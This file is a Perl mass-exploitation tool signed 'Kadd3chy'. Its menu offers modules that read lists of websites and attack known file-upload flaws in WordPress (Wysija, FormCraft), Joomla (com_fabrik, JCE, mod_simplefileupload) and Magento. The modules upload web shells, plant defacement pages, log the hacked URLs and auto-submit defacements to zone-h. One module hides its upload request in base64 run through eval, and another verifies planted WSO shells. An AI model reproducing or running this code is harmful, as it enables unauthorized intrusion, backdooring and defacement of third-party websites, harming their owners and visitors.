#!/usr/bin/perl

#Coded By Kadd3chy

use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5;
use MIME::Base64;
use LWP::Simple;
use IO::Socket;
use HTTP::Request::Common;
use Term::ANSIColor;
$logo="

db   dD  .d8b.  d8888b. d8888b. d8888b.  .o88b. db   db db    db  d88888b db    db d8888b. db       .d88b.  d888888b d888888b d88888b d8888b. 
88 ,8P' d8' `8b 88  `8D 88  `8D VP  `8D d8P  Y8 88   88 `8b  d8'  88'     `8b  d8' 88  `8D 88      .8P  Y8.   `88'   `~~88~~' 88'     88  `8D 
88,8P   88ooo88 88   88 88   88   oooY' 8P      88ooo88  `8bd8'   88ooooo  `8bd8'  88oodD' 88      88    88    88       88    88ooooo 88oobY'    
88`8b   88~~~88 88   88 88   88   ~~~b. 8b      88~~~88    88     88~~~~~  .dPYb.  88~~~   88      88    88    88       88    88~~~~~ 88`8b      V1.0
88 `88. 88   88 88  .8D 88  .8D db   8D Y8b  d8 88   88    88     88.     .8P  Y8. 88      88booo. `8b  d8'   .88.      88    88.     88 `88. 
YP   YD YP   YP Y8888D' Y8888D' Y8888P'  `Y88P' YP   YP    YP     Y88888P YP    YP 88      Y88888P  `Y88P'  Y888888P    YP    Y88888P 88   YD 

";
print $logo;
print color("green"),"[1] Magento Exploiter\n";
print color("red"),"[2] Wysija Exploiter\n";
print color("yellow"),"[3] Com_Fabrik Exploiter\n";
print color("white"),"[4] JCE Mass Exploiter\n";
print color("magenta"),"[5] FormCraft Mass File Upload\n";
print color("cyan"),"[6] Mod_simplefileupload\n";
print color("white"),"[7] 0day WordPress Exploiter\n";
print color("red"),"[8] Shells Checker\n";
print color("yellow on_red"),"[+] Choose Number : ";
my $targett = <>;
chomp $targett;
if($targett eq '1')
{
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

$tnx="
      
##     ##    ###     ######   ######## ##    ## ########  #######      
###   ###   ## ##   ##    ##  ##       ###   ##    ##    ##     ## 
#### ####  ##   ##  ##        ##       ####  ##    ##    ##     ##          
## ### ## ##     ## ##   #### ######   ## ## ##    ##    ##     ##   3xp|0!t3r
##     ## ######### ##    ##  ##       ##  ####    ##    ##     ## 
##     ## ##     ## ##    ##  ##       ##   ###    ##    ##     ## 
##     ## ##     ##  ######   ######## ##    ##    ##     ####### 
    
\n\n
";
 print color('green');
   print $tnx;
print color("white"),"[+] Coded By Kadd3chy [+] \n";
print color("blue"),"[+] Magento Exploiter [+] \n";
print color("yellow"),"List Site  : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "Put Ur List \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filter();
}
sub filter($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $spyxy = $ua->get("$site")->content;
if($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print " =  $site";	
   print color("white on_red"), " - Magento\n\n";     print color('reset');

open(save, '>>Magento.txt');
magento();
    print save "$site\n";
    close(save);
    }
    else{
	print "[+] $site";	
print  color("bold blue"), " => Unknown\n\n";     print color('reset');

}
}


sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Magento] ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploitspymag")->content;
if($checkksbir =~/Success /) {

    print color('bold blue');
print " -- Done\n";
    print color('reset');
    open(save, '>>Brute.txt');
    print save "++ Magento ++ $site hydra|hydra77\n";
    close(save);
    }
else{
    print color('bold blue');
print  "- Failed \n";
    print color('reset');


        }

}}
if($targett eq '2')
{
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
system(($^O eq 'MSWin32') ? 'cls' : 'clear');


print " Coded By Kadd3chy\n";
print " Wysija Exploiter\n";

my $usage = " \nperl $0 <list.txt>\n perl $0 list.txt ";
die "$usage" unless $ARGV[0];

open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
$themez = "my-theme";

my $path = "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
if($target !~ /http:\/\//) { $target = "http://$target/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);

print colored ("[*] Upload Shell =>$target",'white on_blue'),"\n";
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $exploit = $ua->post("$target/$path", Content_Type => 'form-data', Content => [ $themez => ['wsija.zip', => 'wsija.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);

my $check = $ua->get("$target/wp-content/uploads/wysija/themes/mrspy/wsija.php")->content;
my $checkk = $ua->get("$target/wp-includes/wp-media.php")->content;
if($checkk =~/Welcome To Kadd3chy/) {
print colored ("[+] Shell Uploaded !!",'white on_red'),"\n";

    open(save, '>>Shells.txt');
	
    print save "$target/wp-includes/wp-media.php\n";
	
    close(save);

}else {
print "[ERROR] Shell Not Uploaded !!\n";
}


##

    my $checkkk = $ua->get("$target/def.html")->content;
    if($checkkk =~m/Hacked By Kadd3chy/i) {
				open(save, '>>index.txt');
        			print save "$target/def.html\n";
        			close(save);

  				$Def="";
	  print colored ("\n[*] Posting To Zone-H",'white on_blue'),"\n";
	  print "[-] Defacer: $Def\n";		
          print "[+] Post this shit:$target/def.html On Zone-h\n";

				$Dom="$target/def.html";


				if ($Dom =~ /http:\/\//)
				{
				$U="http://zone-h.org/notify/single";
				$lwp=LWP::UserAgent->new;
				$res=$lwp  -> post($U,[
				'defacer'     => $Kadd3chy,
				'domain1'   => $Dom,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print colored ("   [Zone] $target submit $1",'white on_green'),"\n";
				}
				else
				{
				print colored ("   [Zone] $target Error",'red on_green'),"\n";
				}
	
	} 
}
	else 
	{ 
	
	print "[ERROR] Not Defaced Mr.mrspy\n"; 
	
	}

##




















}}
if($targett eq '3')
{
use HTTP::Request;
use LWP::Simple;
use HTTP::Request;
use LWP::Simple;
use LWP::UserAgent;
use Win32::Console::ANSI;
use IO::Socket::INET;
use Term::ANSIColor;


if ($^O =~ /MSWin32/) {system("cls"); system("color A");
}else { system("clear"); }

print color("bold Green"), "[+] Coded By Kadd3chy [+]\n";
print color("bold blue"), "[+] Com_Farbik Exploiter[+]\n";


print color("yellow"), "\n";
print color 'reset';
print color("bold Green"), " Put UR List --> ";
$opn=<STDIN>;
chomp $opn;
print color("yellow"), "\n";
print color 'reset';
print color("bold Green"), " Index Name --> ";
$index=<STDIN>;
chomp $index;

print color("yellow"), "\n";


open(tarrget,"$opn") or die "List Please :D \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
com_fabrik();
}


   sub com_fabrik($site){

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";



my $response = $ua->post( $url,Content_Type => 'form-data',Content => ["file" => ["$index"]]);

$fabrik="$site/$index";

$fabrikindex = $ua->get("$fabrik")->content;
if($fabrikindex =~/Hacked/) {

print color 'reset';
print color("bold green"), "Inject Index : $fabrik [Succeed]\n";
open (TEXT, '>>Done.txt');
print TEXT "$fabrik\n";
close (TEXT);
print color 'reset';
}else{
print color 'reset';
print color("bold red"),"Not Vuln : $fabrik\n";
print color 'reset';
}
}


exit
}
if($targett eq '4')
{
use Term::ANSIColor;
use Win32::Console::ANSI;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$tnx ="

       _   _____  ______   __  __                    ______               _         _  _              
      | | / ____||  ____| |  \/  |                  |  ____|             | |       (_)| |             
      | || |     | |__    | \  / |  __ _  ___  ___  | |__   __  __ _ __  | |  ___   _ | |_  ___  _ __ 
  _   | || |     |  __|   | |\/| | / _` |/ __|/ __| |  __|  \ \/ /| '_ \ | | / _ \ | || __|/ _ \| '__|
 | |__| || |____ | |____  | |  | || (_| |\__ \\__ \ | |____  >  < | |_) || || (_) || || |_|  __/| |   
  \____/  \_____||______| |_|  |_| \__,_||___/|___/ |______|/_/\_\| .__/ |_| \___/ |_| \__|\___||_|   
                                                                  | |                                 
                                                                  |_|                                 



                    

    \n\n
";

    print color('bold red');

print $tnx;

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);
print colored (" Put your list here: ",'white on_red');
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "++Can't open the Website list++ !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

foreach $site(@TARGETS){

chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

print colored ("\n [Testing...] $site\n",'green');


$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){

print colored (" TRYING FOR UPLOAD :/ ",'blue'),"\n";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["Kadd3chy.gif"],
        'action' => 'upload'

        ]
    )->decoded_content;


$remote = IO::Socket::INET->new(
        Proto=>
        PeerAddr=>"$site",
        PeerPort=>
        Timeout=>
        );
$def= "$site/Kadd3chy.gif";
print colored (" Vuln ... :D $site/Kadd3chy.gif\n",'white on_red');

}else{
print colored (" [EXPLOIT FAIL]",'bold blue'),"\n";
}
	open(save, '>>list.txt');
	
    print save "$site/Kadd3chy.gif\n";
	
    close(save);
	
exit
}}
if($targett eq '5')
{
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use LWP::UserAgent;
use Win32::Console::ANSI;
use HTTP::Request;
use Win32::Console::ANSI;
#if u use linux system remove the last line  :p 
#hacked by Kadd3chy
$Kadd3chy ="
  _  __         _     _ ____       _           
 | |/ /        | |   | |___ \     | |          
 | ' / __ _  __| | __| | __) | ___| |__  _   _ 
 |  < / _` |/ _` |/ _` ||__ < / __| '_ \| | | |
 | . \ (_| | (_| | (_| |___) | (__| | | | |_| |
 |_|\_\__,_|\__,_|\__,_|____/ \___|_| |_|\__, |
                                          __/ |
                                         |___/ 
                      Kadd3chy_Shell_Uploader\n
	         WordPress Plugins FormCraft
";
print $Kadd3chy;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
open(tarrget,"<$ARGV[0]") or die "Open Ur Fucking Eyes :D\n";
while(<tarrget>){
chomp($_);
$site = $_;

riahi();




sub riahi(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    print color("green"), "[vuln]";
    print color('reset');
    print " $site\n";
    up();
}else{

 print "$site Nçt Vul :(\n";
}

}

sub up(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="cloud.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//cloud.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /Mister Spy/){
   print color('bold green');
print "Success ... :D\n";
print "--> $upzzspy\n";

    print color('reset');
print color('reset');
open(save, '>>Kadd3chy.txt');   
print save "$upzzspy\n";   
close(save);
}else{
print "...Failed :(\n";
}
}

}}
if($targett eq '6')
{
use HTTP::Request;
use LWP::Simple;
use LWP::UserAgent;
use Win32::Console::ANSI;
use IO::Socket::INET;
use Term::ANSIColor;
use MIME::Base64;

if ($^O =~ /MSWin32/) {system("cls"); system("color A");
}else { system("clear"); }
print color("bold Green")," G.H.:/ Choose name ?\n";
print color("bold Green"), "\n";
print color 'reset';
print color("bold yellow"),"[1] mod_simplefileupload Upload Shell \n";
print color("yellow"), "\n";
print color 'reset';
print color("bold Green"),"Choose --> ";
$name=<STDIN>;
chomp $name;


if ($name=~ "1")
{

print color 'reset';
print color("bold Green"), "\n";
print color 'reset';
print color("bold Green"), "[*]-----------------------------------------------------------------------[*]\n";
print color 'reset';
print color("bold red"), "                      {*} Kadd3chy Leaked Tool Joomla mod_simplefileupload {*}               \n";
print color 'reset';
print color("bold Green"), "[*]-----------------------------------------------------------------------[*]\n";
print color("bold Green"), "\n";



print color("bold red")," List Sites --> ";
$opn=<STDIN>;
chomp $opn;
print color("bold Green"), "\n";
open(tarrget,"$opn") or die "Please Put List :) \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };

mods();
}


   sub mods($site){

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="f.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/udd.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/f.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/Mister Spy/) {
print color("bold Green"),("[Upload Successfully] ==> $shell  \n");
        open (TEXT, '>>Shells.txt');
        print TEXT "[ Shell LINK ] => $site/f.php\n";
		print TEXT "[ Deface Link LINK ] => $site/readme.html\n";
        close (TEXT);
}
else
{
print color 'reset';
print color("bold red"),("[Not Vuln] ==> $site  \n");
}
}

}}
if($targett eq '7')
{
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;


$dispay = "Private By Kadd3chy TNX";

print "\n";
print "$dispay\n";

open(tarrget,"<$ARGV[0]") or die "Put List :) \nExample perl 0day.pl list.txt\n";
while(<tarrget>){
chomp($_);
$site = $_;

#Executer la sub-box
exprocess();

}

sub exprocess{

#Definir l'user agent
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);


print "Starting !\n";
print "	Target scoped : $site\n";

$scope = $site . '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload';
$remotefile = "0day.php";
#$bypassfile = "security.phtml"

#Requete POST a envoyer
$bot1 = POST $scope, (Content_Type => 'form-data', Content => ['file' => [$remotefile]]);
$exrqst = $ua->request($bot1);
$showus = $exrqst->content;

$key1 = '{"filepath":"\/';

if ($showus =~ /0day.php/){

	print "\n";
	print "	Done !!\n";
	print open (SUKSES, '>>Good.txt');
	print SUKSES ("$site/$remotefile\n");
	close SUKSES;
}else{
	print "\n";
	print "	Fuck On\n";
}

}}
if($targett eq '8')
{
use HTTP::Request;
use LWP::Simple;
use LWP::UserAgent;
#use Win32::Console::ANSI; #caso estiver no windows desmarque #
use IO::Socket::INET;
use Term::ANSIColor;


print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

$tnx ="


                                                      
                                                      
 .-. .        . .        .--..           .            
(   )|        | |       :    |           |            
 `-. |--. .-. | | .--.  |    |--. .-. .-.|.-. .-. .--.
(   )|  |(.-' | | `--.  :    |  |(.-'(   |-.'(.-' |   
 `-' '  `-`--'`-`-`--'   `--''  `-`--'`-''  `-`--''   
                                                      
                                                        
                                                                                                                                         
                                                                                                                  
  
  
\n\n
";

    print color('magenta');

print $tnx;

    print color('reset');


print color("bold green")," Put Shells List Here : ";
$open=<STDIN>;
chomp $open;
open(tarrget,"$open") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /http:\/\//)
{
$target = "$target";
}

$website = $target.$adtnx;
 $vuln2 =$vulnn;

$req=HTTP::Request->new(GET=>$website);
$ua=LWP::UserAgent->new();
$ua->timeout(30);
$response=$ua->request($req);
if($response->content=~ $adam )

 {
 print color 'reset';
 $Messageee  ="$vulnn";
print color("bold Green"), "";
open (TEXT, '>>Good.txt');
print TEXT "$target$vuln2\n";
close (TEXT);
}
else {

print color 'reset';
$Messageee = " Bad Shell  ";
print color("bold red"), "";

}
{
print "[+] $target => $Messageee\n";
}
$adtnx= "";
chomp $adtnx;


$adam="WSO";
chomp($adam);


$vulnn=" Good shell";
chomp($vulnn);

}}